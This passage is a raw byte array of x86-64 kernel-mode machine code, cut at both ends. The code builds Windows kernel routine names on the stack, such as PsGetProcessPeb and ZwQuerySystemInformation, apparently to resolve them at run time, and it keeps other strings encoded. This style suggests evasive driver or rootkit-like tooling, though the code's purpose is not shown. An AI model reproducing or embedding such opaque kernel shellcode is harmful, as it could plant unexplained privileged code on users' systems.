0xC7, 0x45, 0xA3, 0x03, 0x01, 0x00, 0x00, 0xE8, 0x24, 0x3C, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x48,
0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0xEF, 0x5E, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xA0, 0x5E, 0x00, 0x00,
0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0xD0, 0x48, 0x89, 0x05, 0x0B, 0x5E, 0x00, 0x00, 0x48, 0x8D, 0x55,
0xA1, 0x48, 0x8B, 0x05, 0xD0, 0x5E, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xC7, 0x44, 0x24, 0x20,
0xBF, 0x00, 0x9A, 0x00, 0xC7, 0x44, 0x24, 0x24, 0x83, 0x00, 0xB6, 0x00, 0xC7, 0x44, 0x24, 0x28,
0x83, 0x00, 0x97, 0x00, 0xC7, 0x45, 0x83, 0x96, 0x00, 0xA1, 0x00, 0xC7, 0x45, 0x87, 0x9B, 0x00,
0x9F, 0x00, 0xC7, 0x45, 0x8B, 0x94, 0x00, 0x97, 0x00, 0xC7, 0x45, 0x8F, 0x9D, 0x00, 0x9F, 0x00,
0xC7, 0x45, 0x93, 0xA8, 0x00, 0x88, 0x00, 0xC7, 0x45, 0x97, 0x8F, 0x00, 0x97, 0x00, 0xC7, 0x45,
0x9B, 0x91, 0x00, 0x67, 0x01, 0xC7, 0x45, 0x9F, 0x01, 0x01, 0x52, 0x00, 0xC7, 0x45, 0xA3, 0x74,
0x00, 0x6C, 0x00, 0xC7, 0x45, 0xA7, 0x46, 0x00, 0x72, 0x00, 0xC7, 0x45, 0xAB, 0x65, 0x00, 0x65,
0x00, 0xC7, 0x45, 0xAF, 0x55, 0x00, 0x6E, 0x00, 0xC7, 0x45, 0xB3, 0x69, 0x00, 0x63, 0x00, 0xC7,
0x45, 0xB7, 0x6F, 0x00, 0x64, 0x00, 0xC7, 0x45, 0xBB, 0x65, 0x00, 0x53, 0x00, 0xC7, 0x45, 0xBF,
0x74, 0x00, 0x72, 0x00, 0xC7, 0x45, 0xC3, 0x69, 0x00, 0x6E, 0x00, 0xC7, 0x45, 0xC7, 0x67, 0x00,
0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0xE5, 0x5D, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF,
0xD0, 0x48, 0x89, 0x05, 0x70, 0x5D, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x19, 0x5E, 0x00, 0x00, 0xC7,
0x44, 0x24, 0x20, 0xA8, 0x00, 0x96, 0x00, 0xC7, 0x44, 0x24, 0x24, 0xAE, 0x00, 0x9C, 0x00, 0xC7,
0x44, 0x24, 0x28, 0x9D, 0x00, 0x9D, 0x00, 0xC7, 0x45, 0x83, 0x90, 0x00, 0x95, 0x00, 0xC7, 0x45,
0x87, 0x81, 0x00, 0x93, 0x00, 0x48, 0x8D, 0x55, 0x97, 0xC7, 0x45, 0x8B, 0xA7, 0x00, 0x97, 0x00,
0x48, 0x8D, 0x4D, 0xFF, 0xC7, 0x45, 0x8F, 0x96, 0x00, 0x96, 0x00, 0xC7, 0x45, 0x93, 0xC9, 0x00,
0xFC, 0x00, 0x33, 0xF6, 0xC7, 0x45, 0x97, 0x45, 0x00, 0x78, 0x00, 0xC7, 0x45, 0x9B, 0x41, 0x00,
0x6C, 0x00, 0xC7, 0x45, 0x9F, 0x6C, 0x00, 0x6F, 0x00, 0xC7, 0x45, 0xA3, 0x63, 0x00, 0x61, 0x00,
0xC7, 0x45, 0xA7, 0x74, 0x00, 0x65, 0x00, 0xC7, 0x45, 0xAB, 0x50, 0x00, 0x6F, 0x00, 0xC7, 0x45,
0xAF, 0x6F, 0x00, 0x6C, 0x00, 0xC7, 0x45, 0xB3, 0x32, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B,
0x05, 0x4B, 0x5D, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0xD0, 0x48, 0x8D, 0x4C, 0x24, 0x20,
0x48, 0x89, 0x05, 0x69, 0x5D, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0xA8, 0x00, 0x96, 0x00, 0xC7,
0x44, 0x24, 0x24, 0xA9, 0x00, 0x82, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x94, 0x00, 0x97, 0x00, 0xC7,
0x45, 0x83, 0xA3, 0x00, 0x9B, 0x00, 0xC7, 0x45, 0x87, 0x9A, 0x00, 0x9A, 0x00, 0xC7, 0x45, 0x8B,
0xA0, 0x00, 0x91, 0x00, 0xC7, 0x45, 0x8F, 0x8D, 0x00, 0x92, 0x00, 0xC7, 0x45, 0x93, 0xAF, 0x00,
0x9D, 0x00, 0x48, 0xC7, 0x45, 0x97, 0x9A, 0x00, 0xFE, 0x00, 0x48, 0x89, 0x75, 0x9F, 0x48, 0x89,
0x75, 0xA7, 0x48, 0x89, 0x75, 0xAF, 0x48, 0x89, 0x75, 0xB7, 0xE8, 0x21, 0x3D, 0x00, 0x00, 0x48,
0x8B, 0xD0, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0x1C, 0x5D, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xCD,
0x5C, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0xD0, 0x48, 0x89, 0x05, 0x98, 0x5C, 0x00, 0x00,
0x48, 0x8D, 0x4C, 0x24, 0x20, 0x33, 0xC0, 0xC7, 0x44, 0x24, 0x20, 0xA2, 0x00, 0x8C, 0x00, 0x48,
0x89, 0x45, 0xA7, 0x48, 0x89, 0x45, 0xAF, 0x48, 0x89, 0x45, 0xB7, 0x48, 0x89, 0x45, 0xBF, 0x48,
0x89, 0x45, 0xC7, 0xC7, 0x44, 0x24, 0x24, 0xA0, 0x00, 0x80, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x94,
0x00, 0x9C, 0x00, 0xC7, 0x45, 0x83, 0xBC, 0x00, 0x96, 0x00, 0xC7, 0x45, 0x87, 0x9F, 0x00, 0x93,
0x00, 0xC7, 0x45, 0x8B, 0x94, 0x00, 0x8C, 0x00, 0xC7, 0x45, 0x8F, 0xBB, 0x00, 0x83, 0x00, 0xC7,
0x45, 0x93, 0xAB, 0x00, 0x93, 0x00, 0xC7, 0x45, 0x97, 0x94, 0x00, 0x90, 0x00, 0xC7, 0x45, 0x9B,
0x8B, 0x00, 0x65, 0x01, 0x48, 0xC7, 0x45, 0x9F, 0x73, 0x01, 0x02, 0x01, 0xE8, 0x8F, 0x38, 0x00,
0x00, 0x48, 0x8B, 0xD0, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0x8A, 0x5C, 0x00, 0x00, 0x48, 0x8B,
0x05, 0x3B, 0x5C, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0xD0, 0x48, 0x89, 0x05, 0xE6, 0x5B,
0x00, 0x00, 0x48, 0x8B, 0x05, 0x6F, 0x5C, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0xA2, 0x00, 0x8C,
0x00, 0xC7, 0x44, 0x24, 0x24, 0xAC, 0x00, 0x9C, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x9E, 0x00, 0x81,
0x00, 0xC7, 0x45, 0x83, 0x96, 0x00, 0xBC, 0x00, 0xC7, 0x45, 0x87, 0x94, 0x00, 0x98, 0x00, 0xC7,
0x45, 0x8B, 0x93, 0x00, 0x94, 0x00, 0xC7, 0x45, 0x8F, 0x9C, 0x00, 0xFA, 0x00, 0xC7, 0x45, 0x93,
0x4F, 0x00, 0x62, 0x00, 0xC7, 0x45, 0x97, 0x43, 0x00, 0x6C, 0x00, 0xC7, 0x45, 0x9B, 0x6F, 0x00,
0x73, 0x00, 0xC7, 0x45, 0x9F, 0x65, 0x00, 0x48, 0x00, 0xC7, 0x45, 0xA3, 0x61, 0x00, 0x6E, 0x00,
0xC7, 0x45, 0xA7, 0x64, 0x00, 0x6C, 0x00, 0x48, 0x8D, 0x55, 0x93, 0xC7, 0x45, 0xAB, 0x65, 0x00,
0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0xB1, 0x5B, 0x00, 0x00, 0x48,
0x8D, 0x4D, 0xFF, 0xFF, 0xD0, 0x48, 0x89, 0x05, 0x74, 0x5B, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24,
0x20, 0x33, 0xC0, 0xC7, 0x44, 0x24, 0x20, 0xA0, 0x00, 0x83, 0x00, 0x48, 0x89, 0x45, 0xA3, 0x48,
0x89, 0x45, 0xAB, 0x48, 0x89, 0x45, 0xB3, 0x48, 0x89, 0x45, 0xBB, 0x89, 0x45, 0xC3, 0xC7, 0x44,
0x24, 0x24, 0xBF, 0x00, 0x82, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x9E, 0x00, 0x90, 0x00, 0xC7, 0x45,
0x83, 0x96, 0x00, 0xB5, 0x00, 0xC7, 0x45, 0x87, 0x9B, 0x00, 0x92, 0x00, 0xC7, 0x45, 0x8B, 0xBB,
0x00, 0x97, 0x00, 0xC7, 0x45, 0x8F, 0x9A, 0x00, 0x91, 0x00, 0xC7, 0x45, 0x93, 0xAB, 0x00, 0x9D,
0x00, 0xC7, 0x45, 0x97, 0x9A, 0x00, 0x9B, 0x00, 0x48, 0xC7, 0x45, 0x9B, 0x8C, 0x00, 0x00, 0x01,
0xE8, 0x5B, 0x36, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0x76, 0x5B,
0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0x24, 0x5B, 0x00, 0x00, 0x33, 0xC0, 0xC7, 0x44,
0x24, 0x20, 0xA0, 0x00, 0x83, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x89, 0x45, 0xB7, 0x48,
0x89, 0x45, 0xBF, 0x48, 0x89, 0x45, 0xC7, 0x48, 0x89, 0x45, 0xCF, 0x48, 0x89, 0x45, 0xD7, 0x48,
0x89, 0x45, 0xDF, 0x89, 0x45, 0xE7, 0xC7, 0x44, 0x24, 0x24, 0xA2, 0x00, 0x91, 0x00, 0xC7, 0x44,
0x24, 0x28, 0x81, 0x00, 0xBE, 0x00, 0xC7, 0x45, 0x83, 0x9C, 0x00, 0x97, 0x00, 0xC7, 0x45, 0x87,
0x9E, 0x00, 0x93, 0x00, 0xC7, 0x45, 0x8B, 0x93, 0x00, 0xA8, 0x00, 0xC7, 0x45, 0x8F, 0x98, 0x00,
0x9D, 0x00, 0xC7, 0x45, 0x93, 0x9E, 0x00, 0x8F, 0x00, 0xC7, 0x45, 0x97, 0xAE, 0x00, 0x8E, 0x00,
0xC7, 0x45, 0x9B, 0x9A, 0x00, 0x63, 0x01, 0xC7, 0x45, 0x9F, 0x68, 0x01, 0x64, 0x01, 0xC7, 0x45,
0xA3, 0x7A, 0x01, 0x47, 0x01, 0xC7, 0x45, 0xA7, 0x64, 0x01, 0x65, 0x01, 0xC7, 0x45, 0xAB, 0x6F,
0x01, 0x6D, 0x01, 0x48, 0xC7, 0x45, 0xAF, 0x09, 0x01, 0x00, 0x00, 0xE8, 0x40, 0x39, 0x00, 0x00,
0x48, 0x8B, 0xD0, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0xCB, 0x5A, 0x00, 0x00, 0x48, 0x8D, 0x4D,
0xFF, 0xFF, 0x15, 0x79, 0x5A, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xBA, 0x5A, 0x00, 0x00, 0x48, 0x8D,
0x55, 0x93, 0x48, 0x8D, 0x4D, 0xFF, 0xC7, 0x44, 0x24, 0x20, 0xA0, 0x00, 0x83, 0x00, 0xC7, 0x44,
0x24, 0x24, 0xBA, 0x00, 0x9E, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x9D, 0x00, 0x9D, 0x00, 0xC7, 0x45,
0x83, 0x90, 0x00, 0x9F, 0x00, 0xC7, 0x45, 0x87, 0xA5, 0x00, 0x97, 0x00, 0xC7, 0x45, 0x8B, 0x90,
0x00, 0x9D, 0x00, 0xC7, 0x45, 0x8F, 0x8A, 0x00, 0xFA, 0x00, 0xC7, 0x45, 0x93, 0x4D, 0x00, 0x6D,
0x00, 0xC7, 0x45, 0x97, 0x55, 0x00, 0x6E, 0x00, 0xC7, 0x45, 0x9B, 0x6C, 0x00, 0x6F, 0x00, 0xC7,
0x45, 0x9F, 0x63, 0x00, 0x6B, 0x00, 0xC7, 0x45, 0xA3, 0x50, 0x00, 0x61, 0x00, 0xC7, 0x45, 0xA7,
0x67, 0x00, 0x65, 0x00, 0xC7, 0x45, 0xAB, 0x73, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8D, 0x4D,
0xFF, 0xFF, 0x15, 0xF9, 0x59, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x3A, 0x5A, 0x00, 0x00, 0x48, 0x8D,
0x55, 0x8B, 0x48, 0x8D, 0x4D, 0xFF, 0xC7, 0x44, 0x24, 0x20, 0xA4, 0x00, 0x81, 0x00, 0xC7, 0x44,
0x24, 0x24, 0xA9, 0x00, 0x82, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x94, 0x00, 0x97, 0x00, 0xC7, 0x45,
0x83, 0xBE, 0x00, 0x90, 0x00, 0xC7, 0x45, 0x87, 0x99, 0x00, 0xF6, 0x00, 0xC7, 0x45, 0x8B, 0x49,
0x00, 0x6F, 0x00, 0xC7, 0x45, 0x8F, 0x46, 0x00, 0x72, 0x00, 0xC7, 0x45, 0x93, 0x65, 0x00, 0x65,
0x00, 0xC7, 0x45, 0x97, 0x4D, 0x00, 0x64, 0x00, 0xC7, 0x45, 0x9B, 0x6C, 0x00, 0x00, 0x00, 0xFF,
0xD0, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0x95, 0x59, 0x00, 0x00, 0x33, 0xC0, 0xC7, 0x44, 0x24,
0x20, 0xA0, 0x00, 0x83, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x89, 0x45, 0xAF, 0x48, 0x89,
0x45, 0xB7, 0x48, 0x89, 0x45, 0xBF, 0x48, 0x89, 0x45, 0xC7, 0x48, 0x89, 0x45, 0xCF, 0x48, 0x89,
0x45, 0xD7, 0xC7, 0x44, 0x24, 0x24, 0xBF, 0x00, 0x82, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x9E, 0x00,
0x86, 0x00, 0xC7, 0x45, 0x83, 0x96, 0x00, 0x97, 0x00, 0xC7, 0x45, 0x87, 0x81, 0x00, 0xBB, 0x00,
0xC7, 0x45, 0x8B, 0x93, 0x00, 0x94, 0x00, 0xC7, 0x45, 0x8F, 0xAA, 0x00, 0x83, 0x00, 0xC7, 0x45,
0x93, 0x88, 0x00, 0x88, 0x00, 0xC7, 0x45, 0x97, 0x98, 0x00, 0x93, 0x00, 0xC7, 0x45, 0x9B, 0xBE,
0x00, 0x64, 0x01, 0xC7, 0x45, 0x9F, 0x65, 0x01, 0x70, 0x01, 0xC7, 0x45, 0xA3, 0x66, 0x01, 0x77,
0x01, 0x48, 0xC7, 0x45, 0xA7, 0x76, 0x01, 0x06, 0x01, 0xE8, 0xC2, 0x32, 0x00, 0x00, 0x48, 0x8B,
0xD0, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0x4D, 0x59, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF,
0x15, 0xFB, 0x58, 0x00, 0x00, 0x33, 0xC0, 0xC7, 0x44, 0x24, 0x20, 0xA0, 0x00, 0x83, 0x00, 0x48,
0x8D, 0x4C, 0x24, 0x20, 0x48, 0x89, 0x45, 0xA3, 0x48, 0x89, 0x45, 0xAB, 0x48, 0x89, 0x45, 0xB3,
0x48, 0x89, 0x45, 0xBB, 0xC7, 0x44, 0x24, 0x24, 0xBA, 0x00, 0x9E, 0x00, 0xC7, 0x44, 0x24, 0x28,
0x9C, 0x00, 0x93, 0x00, 0xC7, 0x45, 0x83, 0x83, 0x00, 0xB8, 0x00, 0xC7, 0x45, 0x87, 0x9A, 0x00,
0x95, 0x00, 0xC7, 0x45, 0x8B, 0x9C, 0x00, 0x9D, 0x00, 0xC7, 0x45, 0x8F, 0x9D, 0x00, 0xAA, 0x00,
0xC7, 0x45, 0x93, 0x9A, 0x00, 0x9B, 0x00, 0xC7, 0x45, 0x97, 0x98, 0x00, 0x8D, 0x00, 0x48, 0xC7,
0x45, 0x9B, 0xFF, 0x00, 0x00, 0x00, 0xE8, 0xD5, 0x39, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x48, 0x8D,
0x4D, 0xFF, 0xFF, 0x15, 0xD0, 0x58, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0x7E, 0x58,
0x00, 0x00, 0x48, 0x8B, 0x05, 0xBF, 0x58, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0xB7, 0x00, 0x99,
0x00, 0xC7, 0x44, 0x24, 0x24, 0xBE, 0x00, 0x85, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x94, 0x00, 0x80,
0x00, 0xC7, 0x45, 0x83, 0x8A, 0x00, 0xA7, 0x00, 0xC7, 0x45, 0x87, 0x8C, 0x00, 0x85, 0x00, 0xC7,
0x45, 0x8B, 0x83, 0x00, 0x9D, 0x00, 0xC7, 0x45, 0x8F, 0x94, 0x00, 0xB3, 0x00, 0xC7, 0x45, 0x93,
0x95, 0x00, 0x9A, 0x00, 0xC7, 0x45, 0x97, 0x92, 0x00, 0x8C, 0x00, 0xC7, 0x45, 0x9B, 0x92, 0x00,
0x61, 0x01, 0xC7, 0x45, 0x9F, 0x75, 0x01, 0x6B, 0x01, 0xC7, 0x45, 0xA3, 0x6C, 0x01, 0x6A, 0x01,
0xC7, 0x45, 0xA7, 0x05, 0x01, 0x5A, 0x00, 0xC7, 0x45, 0xAB, 0x77, 0x00, 0x51, 0x00, 0xC7, 0x45,
0xAF, 0x75, 0x00, 0x65, 0x00, 0x48, 0x8D, 0x55, 0xA9, 0xC7, 0x45, 0xB3, 0x72, 0x00, 0x79, 0x00,
0x48, 0x8D, 0x4D, 0xFF, 0xC7, 0x45, 0xB7, 0x53, 0x00, 0x79, 0x00, 0xC7, 0x45, 0xBB, 0x73, 0x00,
0x74, 0x00, 0xC7, 0x45, 0xBF, 0x65, 0x00, 0x6D, 0x00, 0xC7, 0x45, 0xC3, 0x49, 0x00, 0x6E, 0x00,
0xC7, 0x45, 0xC7, 0x66, 0x00, 0x6F, 0x00, 0xC7, 0x45, 0xCB, 0x72, 0x00, 0x6D, 0x00, 0xC7, 0x45,
0xCF, 0x61, 0x00, 0x74, 0x00, 0xC7, 0x45, 0xD3, 0x69, 0x00, 0x6F, 0x00, 0xC7, 0x45, 0xD7, 0x6E,
0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0xB1, 0x57, 0x00, 0x00, 0x48,
0x8D, 0x4C, 0x24, 0x20, 0xC7, 0x44, 0x24, 0x20, 0xBF, 0x00, 0x9A, 0x00, 0xC7, 0x44, 0x24, 0x24,
0x83, 0x00, 0xB5, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x87, 0x00, 0xC7, 0x45, 0x83, 0x92,
0x00, 0x98, 0x00, 0xC7, 0x45, 0x87, 0xA0, 0x00, 0x98, 0x00, 0xC7, 0x45, 0x8B, 0x9E, 0x00, 0x9B,
0x00, 0xC7, 0x45, 0x8F, 0x96, 0x00, 0x9E, 0x00, 0xC7, 0x45, 0x93, 0x9E, 0x00, 0xAF, 0x00, 0xC7,
0x45, 0x97, 0x89, 0x00, 0x8C, 0x00, 0xC7, 0x45, 0x9B, 0x96, 0x00, 0x6E, 0x01, 0x48, 0xC7, 0x45,
0x9F, 0x66, 0x01, 0x02, 0x01, 0x48, 0x89, 0x75, 0xA7, 0x48, 0x89, 0x75, 0xAF, 0x48, 0x89, 0x75,
0xB7, 0x48, 0x89, 0x75, 0xBF, 0x48, 0x89, 0x75, 0xC7, 0xE8, 0x82, 0x33, 0x00, 0x00, 0x48, 0x8B,
0xD0, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0x7D, 0x57, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF,
0x15, 0x2B, 0x57, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x6C, 0x57, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x97,
0x48, 0x8D, 0x4D, 0xFF, 0xC7, 0x44, 0x24, 0x20, 0xBD, 0x00, 0x9D, 0x00, 0xC7, 0x44, 0x24, 0x24,
0xA8, 0x00, 0x95, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x85, 0x00, 0xA2, 0x00, 0xC7, 0x45, 0x83, 0x81,
0x00, 0x9B, 0x00, 0xC7, 0x45, 0x87, 0x96, 0x00, 0x93, 0x00, 0xC7, 0x45, 0x8B, 0x84, 0x00, 0x8B,
0x00, 0xC7, 0x45, 0x8F, 0xA9, 0x00, 0x9F, 0x00, 0xC7, 0x45, 0x93, 0x99, 0x00, 0xFC, 0x00, 0xC7,
0x45, 0x97, 0x50, 0x00, 0x73, 0x00, 0xC7, 0x45, 0x9B, 0x47, 0x00, 0x65, 0x00, 0xC7, 0x45, 0x9F,
0x74, 0x00, 0x50, 0x00, 0xC7, 0x45, 0xA3, 0x72, 0x00, 0x6F, 0x00, 0xC7, 0x45, 0xA7, 0x63, 0x00,
0x65, 0x00, 0xC7, 0x45, 0xAB, 0x73, 0x00, 0x73, 0x00, 0xC7, 0x45, 0xAF, 0x50, 0x00, 0x65, 0x00,
0xC7, 0x45, 0xB3, 0x62, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0xA0, 0x56, 0x00, 0x00,
0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0xD0, 0x48, 0x89, 0x05, 0x33, 0x56, 0x00, 0x00, 0x33, 0xC0, 0x48,
0x89, 0x45, 0xAF, 0x48, 0x89, 0x45, 0xB7, 0x48, 0x89, 0x45, 0xBF, 0x48, 0x89, 0x45, 0xC7, 0x48,
0x89, 0x45, 0xCF, 0xC7, 0x44, 0x24, 0x20, 0xBD, 0x00, 0x9D, 0x00, 0xC7, 0x44, 0x24, 0x24, 0xA8,
0x00, 0x95, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x85, 0x00, 0xA2, 0x00, 0xC7, 0x45, 0x83, 0x81, 0x00,
0x9B, 0x00, 0xC7, 0x45, 0x87, 0x96, 0x00, 0x93, 0x00, 0xC7, 0x45, 0x8B, 0x84, 0x00, 0x8B, 0x00,
0xC7, 0x45, 0x8F, 0xB0, 0x00, 0x97, 0x00, 0xC7, 0x45, 0x93, 0x9A, 0x00, 0x9B, 0x00, 0xC7, 0x45,
0x97, 0x98, 0x00, 0xB8, 0x00, 0xC7, 0x45, 0x9B, 0x96, 0x00, 0x6C, 0x01, 0xC7, 0x45, 0x9F, 0x64,
0x01, 0x4C, 0x01, 0xC7, 0x45, 0xA3, 0x62, 0x01, 0x69, 0x01, 0x48, 0xC7, 0x45, 0xA7, 0x60, 0x01,
0x06, 0x01, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x89, 0x45, 0xD7, 0xE8, 0xC0, 0x2F, 0x00, 0x00,
0x48, 0x8B, 0xD0, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0x4B, 0x56, 0x00, 0x00, 0x48, 0x8B, 0x05,
0xFC, 0x55, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0xD0, 0x48, 0x89, 0x05, 0xB7, 0x55, 0x00,
0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x33, 0xC0, 0xC7, 0x44, 0x24, 0x20, 0xA2, 0x00, 0x8C, 0x00,
0x48, 0x89, 0x45, 0xAB, 0x48, 0x89, 0x45, 0xB3, 0x48, 0x89, 0x45, 0xBB, 0x48, 0x89, 0x45, 0xC3,
0x48, 0x89, 0x45, 0xCB, 0x89, 0x45, 0xD3, 0xC7, 0x44, 0x24, 0x24, 0xBD, 0x00, 0x95, 0x00, 0xC7,
0x44, 0x24, 0x28, 0x97, 0x00, 0x97, 0x00, 0xC7, 0x45, 0x83, 0x81, 0x00, 0x91, 0x00, 0xC7, 0x45,
0x87, 0x9B, 0x00, 0x95, 0x00, 0xC7, 0x45, 0x8B, 0x92, 0x00, 0xB7, 0x00, 0xC7, 0x45, 0x8F, 0x9B,
0x00, 0x90, 0x00, 0xC7, 0x45, 0x93, 0x9E, 0x00, 0x9F, 0x00, 0xC7, 0x45, 0x97, 0x89, 0x00, 0xBC,
0x00, 0xC7, 0x45, 0x9B, 0x86, 0x00, 0x4E, 0x01, 0xC7, 0x45, 0x9F, 0x60, 0x01, 0x6F, 0x01, 0x48,
0xC7, 0x45, 0xA3, 0x66, 0x01, 0x04, 0x01, 0xE8, 0xD4, 0x2D, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x48,
0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0xAF, 0x55, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0x5D,
0x55, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x9E, 0x55, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x95, 0x48, 0x8D,
0x4D, 0xFF, 0xC7, 0x44, 0x24, 0x20, 0xBD, 0x00, 0x9D, 0x00, 0xC7, 0x44, 0x24, 0x24, 0xA8, 0x00,
0x95, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x85, 0x00, 0xA2, 0x00, 0xC7, 0x45, 0x83, 0x81, 0x00, 0x9B,
0x00, 0xC7, 0x45, 0x87, 0x96, 0x00, 0x93, 0x00, 0xC7, 0x45, 0x8B, 0x84, 0x00, 0x8B, 0x00, 0xC7,
0x45, 0x8F, 0xB0, 0x00, 0x9E, 0x00, 0xC7, 0x45, 0x93, 0xFB, 0x00, 0x50, 0x00, 0xC7, 0x45, 0x97,
0x73, 0x00, 0x47, 0x00, 0xC7, 0x45, 0x9B, 0x65, 0x00, 0x74, 0x00, 0xC7, 0x45, 0x9F, 0x50, 0x00,
0x72, 0x00, 0xC7, 0x45, 0xA3, 0x6F, 0x00, 0x63, 0x00, 0xC7, 0x45, 0xA7, 0x65, 0x00, 0x73, 0x00,
0xC7, 0x45, 0xAB, 0x73, 0x00, 0x49, 0x00, 0xC7, 0x45, 0xAF, 0x64, 0x00, 0x00, 0x00, 0xFF, 0xD0,
0x48, 0x8B, 0x05, 0xD9, 0x54, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0xD0, 0x48, 0x89, 0x05,
0xAC, 0x54, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x89, 0x45, 0xBF, 0x48, 0x89, 0x45, 0xC7, 0x48, 0x89,
0x45, 0xCF, 0x48, 0x89, 0x45, 0xD7, 0xC7, 0x44, 0x24, 0x20, 0xA4, 0x00, 0x81, 0x00, 0xC7, 0x44,
0x24, 0x24, 0xBD, 0x00, 0x95, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x96, 0x00, 0x9B, 0x00, 0xC7, 0x45,
0x83, 0x80, 0x00, 0x80, 0x00, 0xC7, 0x45, 0x87, 0x90, 0x00, 0x84, 0x00, 0xC7, 0x45, 0x8B, 0xB3,
0x00, 0x8A, 0x00, 0xC7, 0x45, 0x8F, 0x90, 0x00, 0x8C, 0x00, 0xC7, 0x45, 0x93, 0x9E, 0x00, 0x8E,
0x00, 0xC7, 0x45, 0x97, 0xAF, 0x00, 0x9B, 0x00, 0xC7, 0x45, 0x9B, 0x96, 0x00, 0x6E, 0x01, 0xC7,
0x45, 0x9F, 0x68, 0x01, 0x76, 0x01, 0xC7, 0x45, 0xA3, 0x6A, 0x01, 0x65, 0x01, 0xC7, 0x45, 0xA7,
0x69, 0x01, 0x6F, 0x01, 0xC7, 0x45, 0xAB, 0x7D, 0x01, 0x69, 0x01, 0xC7, 0x45, 0xAF, 0x7D, 0x01,
0x63, 0x01, 0xC7, 0x45, 0xB3, 0x64, 0x01, 0x62, 0x01, 0x48, 0xC7, 0x45, 0xB7, 0x0D, 0x01, 0x00,
0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x89, 0x45, 0xDF, 0x48, 0x89, 0x45, 0xE7, 0x48, 0x89,
0x45, 0xEF, 0x89, 0x45, 0xF7, 0xE8, 0xB6, 0x2A, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x48, 0x8D, 0x4D,
0xFF, 0xFF, 0x15, 0x61, 0x54, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x12, 0x54, 0x00, 0x00, 0x48, 0x8D,
0x4D, 0xFF, 0xFF, 0xD0, 0x48, 0x89, 0x05, 0x45, 0x54, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20,
0x33, 0xC0, 0xC7, 0x44, 0x24, 0x20, 0xBF, 0x00, 0x9A, 0x00, 0x48, 0x89, 0x45, 0xAB, 0x48, 0x89,
0x45, 0xB3, 0x48, 0x89, 0x45, 0xBB, 0x48, 0x89, 0x45, 0xC3, 0x48, 0x89, 0x45, 0xCB, 0xC7, 0x44,
